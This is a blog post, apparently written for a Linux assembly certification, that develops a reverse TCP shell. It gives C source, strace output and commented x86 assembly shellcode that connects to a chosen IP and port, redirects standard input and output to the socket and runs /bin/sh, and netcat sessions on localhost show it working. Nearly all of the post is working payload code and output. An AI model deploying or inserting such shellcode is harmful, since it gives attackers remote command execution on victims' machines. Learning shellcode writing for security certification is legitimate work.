---
title:  "[SLAE 2] Reverse TCP Shellcode"
---

![Logo](/assets/images/tux-root.png)

## Reverse TCP Shellcode

This is the second assignment of the [SLAE](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) exam: building a reverse TCP shellcode. As for the previous _`bind tcp`_ one, I've started with a C program that creates a reverse TCP connection:
```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
 
int main() {
    int sockfd = 0;
    int ret = 0;
 
    struct sockaddr_in dest;
 
    // Create an un-named socket. returns socket descriptor
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
    memset(&dest, '0', sizeof(struct sockaddr));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr("127.0.0.1"); 
    dest.sin_port = htons(8888);
 
    connect(sockfd, (struct sockaddr *)&dest, sizeof(struct sockaddr));
 
    // Duplicate stdin, stdout, stderr
    ret = dup2(sockfd, 0);
    if (-1 == ret) {
        printf("STDIN duplication failed: %s\n", strerror(errno));
        return 1;
    }
 
    ret = dup2(sockfd, 1);
    if (-1 == ret) {
        printf("STDOUT duplication failed: %s\n", strerror(errno));
        return 1;
    }
 
    ret = dup2(sockfd, 2);
    if (-1 == ret) {
        printf("STDERR duplication failed: %s\n", strerror(errno));
        return 1;
    }
 
    // Replace process image
    char *args[2];
    args[0] = "/bin/sh";
    args[1] = NULL;      // Needs to ne a NULL terminated list of args
 
    ret = execve(args[0], args, NULL);
    if (-1 == ret) {
        printf("Execve failed: %s\n", strerror(errno));
        return 1;
    }
 
    return 0;
}
```

I've then compiled the reverse shell:
```bash
$ gcc -Wall shell_reverse_tcp.c -o shell_reverse_tcp
```

And started the listener to test: 
```bash
$ nc -lvvp 8888
Listening on [0.0.0.0] (family 0, port 8888)
```

And in another terminal executed the reverse shellcode: 
```bash
$ ./shell_reverse_tcp
```

Sure-enough,the listener received a remote connection:
```bash
Listening on [0.0.0.0] (family 0, port 8888)
Connection from [127.0.0.1] port 8888 [tcp/*] accepted (family 2, sport 60226)
whoami
liv
```

To see the system calls necessary to implement this in assembly, I've used _`strace`_:
```bash
$ strace ./shell_reverse_tcp
...
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(8888), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
dup2(3, 0)                              = 0
dup2(3, 1)                              = 1
dup2(3, 2)                              = 2
execve("/bin/sh", ["/bin/sh"], [/* 0 vars */]) = 0
```

Next is the commented assembly source code implementing the system calls from above:
```assembly
global _start   

section .text
_start:

    ; Linux Syscall Reference
    ; http://syscalls.kernelgrok.com/


    ; 1. socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = sockfd
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    push ecx        ; NULL terminate args list
    mov cl, 6       ; IPPROTO_TCP (6)
    push ecx
    xor ecx, ecx
    mov cl, 1       ; SOCK_STREAM (1) - in socket.h
    push ecx
    xor ecx, ecx
    mov cl, 2       ; PF_INET (2) - IP PROTO FAMILY
    push ecx
    mov ecx, esp    ; socketcall arguments
    xor ebx, ebx
    mov bl, 1       ; socketcall type of call: SYS_SOCKET (1) 
    push 102
    pop eax         ; socketcall syscall
    int 0x80
    mov edx, eax    ; sockfd is returned in eax. Save into edx    

    ; 2. connect(3, {sa_family=AF_INET, sin_port=htons(8888), sin_addr=inet_addr("127.0.0.1")}, 16)
    ;struct sockaddr_in {
    ;    short            sin_family;   // e.g. AF_INET, AF_INET6
    ;    unsigned short   sin_port;     // e.g. htons(3490)
    ;    struct in_addr   sin_addr;     // see struct in_addr, below
    ;    char             sin_zero[8];  // zero this if you want to
    ;};
    ;struct in_addr {
    ;    unsigned long s_addr;          // load with inet_pton()
    ;};
    push <IP>       ; IP address
    push word <PORT>; 16 bits - port number
    push word 2     ; family - AF_INET (2)
    mov ecx, esp    ; pointer to args

    push byte 0x10  ; Address length - 16 bytes
    push ecx        ; Pointer to sockaddr_in structure
    push edx        ; sockfd from socket call

    mov ecx, esp    ; socketcall arguments
    xor ebx, ebx
    mov bl, 3       ; socketcall type of call: SYS_CONNECT (3)
    xor eax, eax
    mov al, 102     ; socketcall syscall
    int 0x80

    ; 3. dup2(connfd, 2), dup2(connfd, 1), dup2(connfd, 0)
    push 2
    pop ecx         ; ecx - newfd
    mov ebx, edx    ; edx - connfd, ebx - oldfd
    dup_loop:
    mov al, 63      ; dup2 syscall
    int 0x80
    dec ecx
    jns dup_loop    ; exit when signed (-1)
      
    ; 4. execve("/bin/sh", ["/bin/sh"], [/* 0 vars */])
 ; PUSH the first null dword 
 xor eax, eax
 push eax

    ; PUSH //bin/sh (8 bytes) 
 push 0x68732f2f ; 'hs//'
 push 0x6e69622f ; 'nib/
 mov ebx, esp    ; EBX - 1st param - NULL terminated filename

 push eax        ; EDX - 3rd param - NULL terminated list of env variables
 mov edx, esp    ; NULL terminator must be set before setting the 2nd param!

 push ebx        ; ECX - 2nd param - array of argument strings
 mov ecx, esp

 mov al, 11      ; execve syscall
 int 0x80
```

The IP address and port are replaced by a bash script, which does the compilation and linking:
```bash
$ ./compile.sh 
Usage: compile.sh {ip} {port}
$ ./compile.sh 127.0.0.2 8899
[+] Replacing IP with 0x0200007f
[+] Replacing port number with 0xc322
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Cleaning ...
[+] Done!
$ nc -lvvp 8899 
Listening on [0.0.0.0] (family 0, port 8899)
$ ./shell_reverse_tcp
Connection from [127.0.0.1] port 8899 [tcp/*] accepted (family 2, sport 41801)
whoami
liv
```

##

The complete source files and scripts mentioned in this post can be found in my [SLAE Git repository](https://github.com/livz/slae).

**_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)_**
